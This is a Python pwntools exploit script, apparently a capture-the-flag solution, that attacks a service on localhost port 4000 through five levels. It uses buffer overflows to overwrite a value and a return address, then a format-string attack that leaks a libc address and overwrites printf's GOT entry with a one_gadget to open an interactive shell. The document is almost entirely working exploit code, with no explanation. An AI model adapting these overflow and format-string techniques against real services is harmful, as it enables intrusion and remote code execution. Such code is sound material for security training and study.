#!/usr/bin/python
from pwn import *

def level5_read(string):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil('!\n')
    r.sendline(string)
    return r.recvuntil('Still')[:-5].strip()

def fmt_hn(prev, target, adr):
    global total
    total = ((target - prev) & 0xffff)
    return "%" + str(total) + "c%" + str(adr) + "$hn"


host = 'localhost'
port = 4000
r = remote(host, port)
# level 1
r.recvuntil(':')
r.sendline('252534')
# level 2
r.recvuntil('?')
r.send('a'*124 + '\xc9\x07\xcc\x00')
# level 3
# 0x0804862d
r.recvuntil('?')
r.sendline('a'*0x88 + '\x2d')
# level 4
r.recvuntil(':')
r.sendline('73')
r.recvuntil('?')
r.sendline('a'*108 + p32(0x804a47c))
# level 5
printf_got = 0x0000000000601230
level5_read('%6$p')
libc = int(level5_read('%61$p'), 16) - 0x3c5620
print ('libc : ', hex(libc))
one_gadget = libc + 0x45216

payload = ''
prev = 0
place = 20
for i in range(3):
    payload += fmt_hn(prev, ((one_gadget >> (i*16) & 0xffff)), place + i)
    prev = ((one_gadget >> (i*16)) & 0xffff)
payload = payload.ljust(((place-6) * 8), 'a') + p64(printf_got) + p64(printf_got + 2) + p64(printf_got + 4)
level5_read(payload)
r.interactive()
